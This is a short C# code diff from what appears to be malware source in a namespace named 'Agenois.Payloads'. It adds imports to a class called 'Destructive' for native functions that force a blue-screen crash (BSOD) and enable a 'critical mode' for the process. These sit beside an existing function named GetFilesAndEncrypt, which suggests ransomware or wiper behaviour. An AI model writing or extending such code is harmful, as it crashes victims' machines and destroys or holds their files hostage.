@@ -79,6 +79,12 @@ namespace Agenois.Payloads
     }
     class Destructive
     {
+        //Temp location, change if you want.
+        [DllImport(@"C:\Windows\System32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?BSOD@Payloads@1@QAEXXZ")]
+        public static extern bool BSOD();
+        [DllImport(@"C:\Windows\System32\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?EnableCriticalMode@Payloads@1@QAEXXZ")]
+        public static extern bool EnableCriticalMode();
+
         static void GetFilesAndEncrypt(string Ps)
         {
             try
